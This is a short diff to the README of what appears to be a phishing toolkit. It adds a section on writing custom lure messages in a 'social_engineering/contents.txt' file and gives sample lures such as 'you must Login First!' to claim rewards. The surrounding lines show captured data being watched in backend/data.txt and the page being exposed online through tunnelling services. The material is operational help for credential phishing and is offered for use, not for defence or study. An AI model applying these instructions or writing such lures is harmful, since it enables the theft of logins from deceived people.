@@ -37,6 +37,11 @@ Then open another session
     watch -n 5 'cat backend/data.txt'
 ```
 
+## Customizing your Phishing ..
+Inside the folder '**social_engineering**', you will find the '**contents.txt**', inside which you write your custom Phishing words of pursuing, like ..
+- Inorder to get your Rewards, you must Login First!
+- Login to proceed ..
+
 ## How to make it available online?
 
 You can use **ngrok**, **localexpose** or other similar services that makes the tunnelling.
